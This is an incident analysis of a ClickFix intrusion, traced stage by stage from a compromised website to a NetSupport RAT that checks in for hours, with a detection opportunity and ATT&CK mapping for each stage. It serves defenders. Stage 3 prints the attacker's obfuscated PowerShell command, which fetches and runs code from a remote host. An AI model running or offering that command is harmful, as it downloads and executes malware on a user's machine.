# Stages

The intrusion breaks into eight stages. Each stage lists what happened, the evidence for it and where a defender gets a chance to detect it.

## 1. Site

The victim browsed to crownherliving[.]com at 21:57:41.465 `[PCAP]`. The page loaded an asset from bronkbuilder-website-assets.s3.us-east-2.amazonaws[.]com `[PCAP]` and a script from wuntred[.]com `[PCAP]`.

**Detection opportunity.** Proxy and DNS logs show the injected script host loading straight after a normal site. Domain reputation on wuntred[.]com is the main control here. Its addresses sit in shared CDN ranges, so blocking by IP is weak `[Inference]`. ATT&CK T1189.

## 2. Lure

kyc2.js came from adsmanagertgo[.]click at 21:57:43.325 `[PCAP]`. It called adsmanagerast[.]pro with change.php?fp=1 to fingerprint the browser `[Notes]`, then drew a fake CAPTCHA served from adsmanagerast[.]pro `[PCAP]`. Each click sent change.php?click=1 back to the same host `[Notes]`.

**Detection opportunity.** Newly seen domains on `.click` and `.pro` serving JavaScript in the same second as a page load. Web proxy categories and DNS first-seen alerts cover this. ATT&CK T1204.004.

## 3. Paste

The second click at 21:58:13.232 placed this command on the clipboard `[Notes]`.

```
powershell -NoProfile -c "& ((Get-Command|?{$_.Name -match ('vok.*Re'+'st')})[0].Name)('anycheckgocap[.]com')|& ((Get-Command|?{$PSItem.Name -match ('vo'+'k.*Ex')})[0].Name)"
```

The command resolves Invoke-RestMethod and Invoke-Expression at run time through Get-Command and split strings, so the literal names never appear `[Decoded]`. The victim pasted it into the Run box `[Inference]`, which is the standard ClickFix pattern and fits explorer.exe as the parent.

**Detection opportunity.** Process creation with explorer.exe as parent, a PowerShell child, a fetch term and an execute term. RunMRU registry writes holding `powershell` or `http`. See UC-01, `clickfix_runbox.kql` and the Sigma rules. ATT&CK T1204.004, T1059.001, T1027.

## 4. PowerShell

At 21:59:33.709 PowerShell requested `/` from anycheckgocap[.]com on 94.26.0[.]162:80 `[PCAP]`. The response was a 16,043 byte stage-2 script `[Decoded]`. It checks the computer name, hides the console, checks a marker file and downloads an embeddable Python runtime with four fallback methods `[Decoded]`. Details are in [decoded-config.md](decoded-config.md).

**Detection opportunity.** Script block logging (4104) on GetConsoleWindow with ShowWindow, `-bxor`, FromBase64String with ProgramData and Expand-Archive into LocalAppData. See UC-02. ATT&CK T1059.001, T1027, T1105.

## 5. Python

At 21:59:34.837 the host fetched the Python 3.12.7 embeddable zip from www.python[.]org `[PCAP]`. The script extracts it to `%LOCALAPPDATA%\.k835d0dd0454\py-embed\312\` and starts a hidden embedded Python loader `[Decoded]`.

**Detection opportunity.** Requests for `/ftp/python/*/python-*-embed-*.zip` from hosts that are not developer workstations, and python.exe or pythonw.exe running from a hidden hex-named folder under AppData\Local. See UC-03. ATT&CK T1059.006, T1105.

## 6. MP4

At 21:59:38.329 the loader downloaded hxxp://94.26.0[.]162/0909.mp4 with the User-Agent `Mozilla/5.0` and nothing else `[PCAP]` `[Decoded]`. The file is a valid MP4 with a payload hidden in a `uuid` box `[Decoded]`. Decoding the box gives host.py, about 15.3 MB of Python that carries 20 NetSupport files as base64 `[Decoded]`.

**Detection opportunity.** Video content from a bare IP address with a short non-browser User-Agent. The uuid box marker `FB DB 81 0D` is a stable file and network signature. See UC-04 and the YARA rules. ATT&CK T1027.003, T1105.

## 7. C2

dasiiiitt[.]com resolved to 93.152.209[.]36 at 21:59:42.758 `[PCAP]`. The first NetSupport POST followed at 21:59:42.986 `[PCAP]`. The client sent plain HTTP to port 443 with User-Agent `NetSupport Manager/1.3` and the gateway answered with `NetSupport Gateway/1.92 (Windows NT)` `[PCAP]`. The client was a renamed client32.exe, MIseN.Exe, in C:\Users\Public\Documents `[Decoded]` `[Notes]`.

**Detection opportunity.** The NetSupport User-Agent and server header are unambiguous. Plain HTTP on port 443 is a second signal. See UC-05, UC-06, `netsupport_out_of_place.kql` and Suricata sid 9260001, which fired 320 times against the capture, the same count as the check-ins `[Inference]`. ATT&CK T1219, T1571, T1036.003.

## 8. Dwell

The client checked in 320 times with a mean interval of 59.6 s until 03:16:25.865 on 2026-11-17 `[PCAP]`. Persistence used a random ten letter .vbs in the Startup folder launched by wscript.exe `//B //Nologo` `[Decoded]`, and the exercise notes confirm two Startup .vbs files `[Notes]`. The agent settings also hold HKCU Run values, but which one was written cannot be seen in the capture `[Inference]`.

**Detection opportunity.** File creation of .vbs in a Startup folder followed by wscript.exe `//B`, and new HKCU Run values named OneDriveSyncHelper or SecurityHealth that point outside Program Files. A steady one minute check-in for hours is easy to spot in NDR flow data. See UC-06 and UC-07. ATT&CK T1547.001.
